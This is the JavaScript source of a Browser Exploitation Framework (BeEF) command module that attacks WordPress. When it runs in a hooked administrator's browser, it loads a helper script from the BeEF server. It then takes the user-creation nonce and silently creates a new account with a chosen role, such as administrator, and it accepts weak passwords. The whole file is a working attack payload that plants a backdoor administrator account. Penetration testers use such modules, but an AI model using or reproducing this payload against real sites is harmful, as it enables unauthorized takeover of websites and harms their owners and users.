/*
  Copyright (c) Browser Exploitation Framework (BeEF) - http://beefproject.com
  See the file 'doc/COPYING' for copying permission

  This is a complete rewrite of the original module exploits/wordpress_add_admin which was not working anymore
  
  Original Author: Daniel Reece (@HBRN8).
  Rewritten by Erwan LR (@erwan_lr | WPScanTeam) - https://wpscan.org/
*/


beef.execute(function() {
  beef_command_url = '<%= @command_url %>';
  beef_command_id  = <%= @command_id %>;

  // Adds wp.js to the DOM so we can use some functions here
  if (typeof get_nonce !== 'function') {
    var wp_script = document.createElement('script');

    wp_script.setAttribute('type', 'text/javascript');
    wp_script.setAttribute('src', beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/wp.js');
    var theparent = document.getElementsByTagName('head')[0];
    theparent.insertBefore(wp_script, theparent.firstChild);
  }

  var create_user_path = '<%= @wp_path %>wp-admin/user-new.php';

  /*
    When there is an error (such as incorrect email, username already existing etc),
    the response will be a 200 with an ERROR in the body
    
    When successfully created, it's a 302, however the redirection is followed by the web browser
    and the 200 is served directly to the AJAX response here and we don't get the 302,
    so we check for the 'New user created.' pattern in the page
  */
  function check_response_for_error(xhr) {
    if (xhr.status == 200) {
      responseText = xhr.responseText;

      if ((matches = /<strong>ERROR<\/strong>: (.*?)<\/p>/.exec(responseText))) {
        log('User Creation failed: ' + matches[1], 'error');
      }
      else if (/New user created/.test(responseText)) {
        log('User successfully created!', 'success');
      }
    }
  }

  function create_user(nonce) {
    post(
      create_user_path,
      {
        action: 'createuser',
        '_wpnonce_create-user': nonce,
        '_wp_http_referer': create_user_path,
        user_login: '<%= @username %>',
        email: '<%= @email %>',
        first_name: '',
        last_name: '',
        url: '',
        pass1: '<%= @password %>',
        pass2: '<%= @password %>',
        pw_weak: 'on', // Just in case
        role: '<%= @role %>',
        createuser: 'Add+New+User'
      },
      function(xhr) { check_response_for_error(xhr) }
    );
  }

  // Timeout needed for the wp.js to be loaded first
  setTimeout(
    function() {
      get_nonce(
        create_user_path,
        '_wpnonce_create-user',
        function(nonce) { create_user(nonce) }
      )
    },
    300
  );

});

